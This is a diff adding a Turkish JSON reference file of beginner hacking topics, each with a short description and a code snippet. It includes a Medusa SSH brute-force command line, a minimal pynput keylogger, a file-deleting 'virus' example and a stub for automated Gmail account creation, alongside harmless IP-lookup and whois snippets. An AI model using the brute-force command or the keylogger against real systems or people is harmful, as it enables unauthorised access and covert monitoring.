@@ -1,0 +1,34 @@
+{
+  "brute_force": {
+    "aciklama": "Belirli bir parola listesi ile şifre kırma denemesi yapar. Yalnızca izinli sistemlerde kullanılmalıdır.",
+    "ornek": "parolalar = ['123456', 'password', 'qwerty']\nfor parola in parolalar:\n    if parola == 'denenen_sifre':\n        print(f'Parola bulundu: {parola}')\n        break"
+  },
+  "medusa": {
+    "aciklama": "Parola kırma için kullanılan hızlı bir brute force aracıdır. Komut satırı tabanlıdır.",
+    "ornek": "medusa -h hedef_ip -u kullanıcı -P parola_listesi.txt -M ssh"
+  },
+  "keylogger": {
+    "aciklama": "Klavye tuşlarını kaydeden araç. Etik kullanım önemlidir.",
+    "ornek": "from pynput import keyboard\n\ndef on_press(key):\n    print(f'Tuş basıldı: {key}')\n\nwith keyboard.Listener(on_press=on_press) as listener:\n    listener.join()"
+  },
+  "virus": {
+    "aciklama": "Kötü amaçlı yazılım örneği. Sadece öğrenme amaçlıdır, etik dışı kullanım yasaktır.",
+    "ornek": "# Basit dosya silme virüsü örneği (kullanmayınız).\nimport os\nos.remove('örnek_dosya.txt')"
+  },
+  "ip_tracer": {
+    "aciklama": "Bir IP adresinin konumunu ve bilgilerini bulmak için kullanılır.",
+    "ornek": "import requests\nip = input('IP adresi gir: ')\nresponse = requests.get(f'https://ipinfo.io/{ip}/json')\nprint(response.json())"
+  },
+  "osint": {
+    "aciklama": "Açık kaynak istihbarat toplama aracı. İnternetten veri toplayarak analiz yapar.",
+    "ornek": "# Örnek: Whois sorgusu\nimport whois\nalan_adi = input('Alan adı gir: ')\nprint(whois.whois(alan_adi))"
+  },
+  "sifre_listesi": {
+    "aciklama": "Popüler şifre kombinasyonlarını içeren liste oluşturur.",
+    "ornek": "harfler = 'abc123'\nsifreler = [a+b for a in harfler for b in harfler]\nprint(sifreler)"
+  },
+  "gmail_acma": {
+    "aciklama": "Otomatik Gmail hesabı açma için kullanılan otomasyon aracıdır.",
+    "ornek": "# Selenium ile otomatik Gmail hesabı oluşturma örneği\nfrom selenium import webdriver\n\nbrowser = webdriver.Chrome()\nbrowser.get('https://accounts.google.com/signup')\n# Form doldurma kodları buraya gelecek"
+  }
+}
